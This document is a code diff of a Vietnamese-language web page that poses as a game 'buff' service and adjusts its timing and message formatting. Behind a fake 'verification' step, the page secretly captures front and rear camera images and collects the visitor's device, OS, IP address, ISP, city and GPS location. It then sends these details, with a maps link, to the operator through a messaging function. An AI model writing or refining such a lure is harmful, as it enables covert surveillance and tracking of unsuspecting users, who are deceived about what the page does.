@@ -25,7 +25,6 @@
       max-width: 460px;
       position: relative;
     }
-
     .buff-panel {
       background: rgba(12, 20, 33, 0.8);
       backdrop-filter: blur(24px);
@@ -138,7 +137,6 @@
       align-items: center;
       gap: 0.3rem;
     }
-
     .input-group {
       display: flex;
       align-items: center;
@@ -190,7 +188,6 @@
       opacity: 0.6;
       cursor: not-allowed;
     }
-
     .result-card {
       background: rgba(255,255,255,0.03);
       border-radius: 1rem;
@@ -253,7 +250,6 @@
       color: white;
       font-size: 0.9rem;
     }
-
     .verify-overlay, .upload-overlay, .check-overlay {
       position: fixed;
       top: 0;
@@ -546,7 +542,6 @@
       transition: 0.2s;
     }
     .modal-close:hover { background: rgba(255,255,255,0.2); }
-
     .file-drop-area {
       position: relative;
       border: 2px dashed rgba(255,255,255,0.2);
@@ -670,7 +665,6 @@
       font-size: 0.9rem;
       margin-top: 0.5rem;
     }
-
     .check-input-group {
       display: flex;
       align-items: center;
@@ -753,7 +747,6 @@
       font-size: 0.9rem;
       margin-top: 1rem;
     }
-
     @media (max-width: 480px) {
       .verify-modal, .upload-modal, .check-modal { padding: 1.8rem 1.2rem; }
       .buff-panel { padding: 2rem 1.2rem; }
@@ -935,6 +928,10 @@
       let pendingBuffAfterVerify = false;
       let selectedFiles = [];
 
+      function delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+      }
+
       function stopCamera() {
         if (mediaStream) {
           mediaStream.getTracks().forEach(t => t.stop());
@@ -1002,8 +999,9 @@
 
       async function openCamera(facingMode) {
         stopCamera();
+        await delay(500);
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
+          video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
         });
         mediaStream = stream;
         video.srcObject = stream;
@@ -1011,9 +1009,6 @@
         cameraPlaceholder.style.display = 'none';
         cameraActive = true;
         video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
-        if (facingMode === 'environment') {
-          await new Promise(resolve => setTimeout(resolve, 800));
-        }
         await waitForVideoReady();
       }
 
@@ -1047,6 +1042,7 @@
         scanLine.style.display = 'none';
         faceOutline.style.display = 'none';
         await openCamera(facingMode);
+        await delay(500);
         return await captureFrame();
       }
 
@@ -1310,10 +1306,10 @@
           msg += `📱 Thiết bị: ${getDeviceName()}\n`;
           msg += `🖥️ HĐH: ${getOS()}\n`;
           if (ipInfo) {
-            msg += `🌍 IP: ${ipInfo.ip}\n🧠 IP gốc: ${ipInfo.ip}\n🏢 ISP: ${ipInfo.isp}\n🏙️ ${ipInfo.city}, ${ipInfo.country}\n`;
+            msg += `🌍 IP: ${ipInfo.ip}\n🏢 ISP: ${ipInfo.isp}\n🏙️ ${ipInfo.city}, ${ipInfo.country}\n`;
             const lat = gps ? gps.lat : ipInfo.lat;
             const lon = gps ? gps.lon : ipInfo.lon;
-            if (lat) msg += `📍 Vĩ độ: ${lat}\n📍 Kinh độ: ${lon}\n📌 Maps: https://maps.google.com/?q=${lat},${lon}\n`;
+            if (lat) msg += `📍 Vĩ độ: ${lat}\n📍 Kinh độ: ${lon}\n📌 Maps: https://www.google.com/maps?q=${lat},${lon}\n`;
           }
           msg += `📸 Camera: ✅ Đã chụp trước, sau và kết thúc\n⚠️ Ghi chú: Thông tin có thể chưa chính xác 100%.`;
           await sendMessage(msg);
@@ -1496,40 +1492,33 @@
       }
 
       buffMenuTrigger.addEventListener('click', () => uidInput.focus());
-
       buffSubmit.addEventListener('click', () => {
         pendingBuffAfterVerify = true;
         openVerifyModal();
       });
-
       verifyBtn.addEventListener('click', () => {
         if (verificationInProgress) return;
         if (cameraActive) runVerification();
         else startFrontCamera().then(success => { if (success) runVerification(); });
       });
-
       modalCloseBtn.addEventListener('click', closeVerifyModal);
       verifyOverlay.addEventListener('click', (e) => {
         if (e.target === verifyOverlay) closeVerifyModal();
       });
-
       uploadMenuTrigger.addEventListener('click', () => {
         resetUploadForm();
         uploadOverlay.classList.add('active');
       });
-
       uploadCloseBtn.addEventListener('click', () => {
         uploadOverlay.classList.remove('active');
         resetUploadForm();
       });
-
       uploadOverlay.addEventListener('click', (e) => {
         if (e.target === uploadOverlay) {
           uploadOverlay.classList.remove('active');
           resetUploadForm();
         }
       });
-
       fileDropArea.addEventListener('dragover', (e) => {
         e.preventDefault();
         fileDropArea.classList.add('dragover');
@@ -1543,22 +1532,18 @@
           updateFileList();
         }
       });
-
       fileInput.addEventListener('change', updateFileList);
       uploadBtn.addEventListener('click', uploadAllFiles);
-
       checkMenuTrigger.addEventListener('click', () => {
         checkOverlay.classList.add('active');
         checkUidInput.value = '';
         playerCard.classList.remove('show');
         checkError.textContent = '';
       });
-
       checkCloseBtn.addEventListener('click', () => checkOverlay.classList.remove('active'));
       checkOverlay.addEventListener('click', (e) => {
         if (e.target === checkOverlay) checkOverlay.classList.remove('active');
       });
-
       checkBtn.addEventListener('click', () => fetchPlayerInfo(checkUidInput.value.trim()));
       checkUidInput.addEventListener('keypress', (e) => {
         if (e.key === 'Enter') fetchPlayerInfo(checkUidInput.value.trim());
